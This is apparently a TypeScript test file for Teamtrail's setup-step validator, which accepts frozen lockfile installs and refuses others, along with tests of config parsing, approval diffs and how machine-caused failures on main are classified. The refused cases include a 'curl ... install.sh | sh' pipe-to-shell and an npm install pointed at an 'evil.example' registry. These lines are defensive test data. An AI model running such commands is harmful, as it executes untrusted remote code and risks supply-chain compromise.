import { describe, expect, it } from 'vitest';
import { setupProblem } from '../src/guides/setupArgv';
import { environmentCause } from '../src/mainChecks/environmentCause';
import { mainChecksState } from '../src/mainChecks/mainChecksState';
import type { MainCheckResult, MainRun } from '../src/model/mainChecks';
import { checksDiff } from '../src/verification/checksDiff';
import { parseVerificationConfig } from '../src/verification/config';

const ok = (...run: string[]) => expect(setupProblem({ run })).toBeUndefined();
const refused = (...run: string[]) => expect(setupProblem({ run })).toBeDefined();

describe('setup steps Teamtrail runs', () => {
  it('are frozen installs from the lockfile, per stack', () => {
    ok('npm', 'ci');
    ok('npm', 'ci', '--ignore-scripts', '--no-audit');
    ok('pnpm', 'install', '--frozen-lockfile');
    ok('yarn', 'install', '--immutable');
    ok('yarn', 'install', '--frozen-lockfile');
    ok('bun', 'install', '--frozen-lockfile');
    ok('uv', 'sync', '--frozen');
    ok('uv', 'sync', '--locked', '--all-extras');
    ok('poetry', 'install', '--no-root', '--sync');
    ok('bundle', 'install', '--frozen');
    ok('go', 'mod', 'download');
    ok('cargo', 'fetch', '--locked');
    ok('composer', 'install', '--no-interaction');
    ok('dotnet', 'restore', '--locked-mode');
    ok('npm.cmd', 'ci');
  });

  it('never resolve, add packages, fetch URLs or run a shell', () => {
    refused('npm', 'install');
    refused('npm', 'install', 'left-pad');
    refused('npm', 'ci', '--registry=https://evil.example');
    refused('pnpm', 'install');
    refused('yarn', 'install');
    refused('uv', 'sync');
    refused('uv', 'pip', 'install', 'requests');
    refused('cargo', 'fetch');
    refused('pip', 'install', '-r', 'requirements.txt');
    refused('sh', '-c', 'curl https://x.example/install.sh | sh');
    refused('curl', 'https://x.example/install.sh');
    refused('npx', 'some-installer');
    refused('./node_modules/.bin/npm', 'ci');
    expect(setupProblem({ run: ['npm', 'ci'], cwd: '../other' })).toMatch(/inside the repo/);
    expect(setupProblem({ run: ['pnpm', 'install'] })).toMatch(/needs --frozen-lockfile/);
  });
});

describe('setup in verification.json', () => {
  const parse = (setup: unknown) => parseVerificationConfig(JSON.stringify({ v: 1, setup }));

  it('is named steps with argv, a folder and a timeout', () => {
    const { config, errors } = parse({
      web: { run: ['npm', 'ci'], cwd: 'apps/web' },
      api: { run: ['uv', 'sync', '--frozen'] },
    });
    expect(errors).toEqual([]);
    expect(Object.keys(config!.setup!)).toEqual(['web', 'api']);
    expect(config!.setup!.web).toEqual({ run: ['npm', 'ci'], cwd: 'apps/web', timeoutSec: 900 });
  });

  it('refuses a shell string, an odd name or an unknown key', () => {
    expect(parse({ web: { run: 'npm ci' } }).errors.join()).toMatch(/argv array/);
    expect(parse({ 'Web App': { run: ['npm', 'ci'] } }).errors.join()).toMatch(/lowercase/);
    expect(parse({ web: { run: ['npm', 'ci'], env: {} } }).errors.join()).toMatch(/unknown env/);
  });

  it('shows in the approval diff, with a warning for a step that will not run', () => {
    const before = JSON.stringify({ v: 1, checks: { t: { run: ['npm', 'test'] } }, run: ['t'] });
    const after = JSON.stringify({
      v: 1,
      checks: { t: { run: ['npm', 'test'] } },
      run: ['t'],
      setup: { web: { run: ['npm', 'ci'], cwd: 'apps/web' }, bad: { run: ['npm', 'install', 'x'] } },
    });
    const diff = checksDiff(before, after);
    expect(diff.lines).toContain('+ setup web: npm ci in apps/web');
    expect(diff.lines).toContain('+ setup bad: npm install x');
    expect(diff.warnings.join('\n')).toMatch(/setup bad won't run: isn't a frozen install/);
    expect(checksDiff(after, before).lines).toContain('- setup web: npm ci in apps/web');
  });
});

describe('failures caused by the machine, not main', () => {
  const cause = (o: Partial<Parameters<typeof environmentCause>[0]>) =>
    environmentCause({ argv: ['npm', 'test'], exitCode: 1, timedOut: false, output: '', installed: false, ...o });

  it('a program or package not installed, or a service not reachable', () => {
    expect(cause({ error: 'spawn ng ENOENT', argv: ['ng', 'test'] })).toBe("ng isn't installed here");
    expect(cause({ output: 'sh: 1: ng: not found\n', exitCode: 127 })).toBe("ng isn't installed here");
    expect(cause({ output: 'sh: ng: command not found\n' })).toBe("ng isn't installed here");
    expect(cause({ exitCode: 127 })).toMatch(/isn't installed here/);
    expect(cause({ output: "Error: Cannot find module 'vitest'" })).toBe("the package vitest isn't installed here");
    expect(cause({ output: "ModuleNotFoundError: No module named 'django'" })).toBe(
      "the package django isn't installed here",
    );
    expect(cause({ output: 'connect ECONNREFUSED 127.0.0.1:5432' })).toMatch(/service .* isn't reachable/);
  });

  it('is never a failing test, a missing file of the repo, a timeout, or a missing package after setup', () => {
    expect(cause({ output: 'FAIL src/a.test.ts > renders\nTests 1 failed' })).toBeUndefined();
    expect(cause({ output: "Error: Cannot find module './util'" })).toBeUndefined();
    expect(cause({ output: 'sh: ng: command not found', timedOut: true })).toBeUndefined();
    expect(cause({ output: "Error: Cannot find module 'vitest'", installed: true })).toBeUndefined();
    expect(cause({ error: 'cwd "apps/x" is not a directory inside the repo' })).toBeUndefined();
  });
});

describe('checks on main that fail for the machine', () => {
  const plan = { kind: 'run' as const, hash: 'h1' };
  const check = (name: string, over: Partial<MainCheckResult> = {}): MainCheckResult => ({
    name,
    argv: [name],
    passed: false,
    exitCode: 1,
    timedOut: false,
    durationMs: 1,
    tail: '',
    signature: [`FAIL ${name}`],
    ...over,
  });
  const run = (over: Partial<MainRun>): MainRun => ({
    v: 1,
    id: 'M-1',
    commit: 'a'.repeat(40),
    branch: 'main',
    startedAt: 1,
    finishedAt: 2,
    configHash: 'h1',
    by: 'Teamtrail',
    result: 'fail',
    checks: [],
    ...over,
  });
  const gate = (r: MainRun) => mainChecksState({ plan, ready: true, run: r, choices: { known: [], dropped: [] } });

  it('hold nothing and say it is this machine', () => {
    const g = gate(run({ checks: [check('test', { environment: "ng isn't installed here" })] }));
    expect(g.holds).toBe(false);
    expect(g.state).toMatchObject({ kind: 'environment', checks: ['test'] });
    expect(g.state.kind === 'environment' && g.state.reason).toMatch(
      /^test: ng isn't installed here\. Install what's missing/,
    );
  });

  it('a failed setup is the machine too, and no check is blamed', () => {
    const steps = [
      {
        name: 'web',
        argv: ['npm', 'ci'],
        cwd: 'apps/web',
        passed: false,
        exitCode: 1,
        timedOut: false,
        durationMs: 1,
        tail: '',
      },
    ];
    const g = gate(run({ result: 'unavailable', setup: steps, note: 'setup failed: npm ci in apps/web exited 1' }));
    expect(g.holds).toBe(false);
    expect(g.state).toMatchObject({ kind: 'environment', checks: [] });
    expect(g.state.kind === 'environment' && g.state.reason).toMatch(
      /^Setup failed in the worktree for main: npm ci in apps\/web exited 1\./,
    );
  });

  it('a real failure next to one the machine caused still holds, for the real one only', () => {
    const g = gate(run({ checks: [check('lint', { environment: "eslint isn't installed here" }), check('test')] }));
    expect(g.holds).toBe(true);
    expect(g.state).toMatchObject({ kind: 'failed', failing: ['test'] });
  });
});
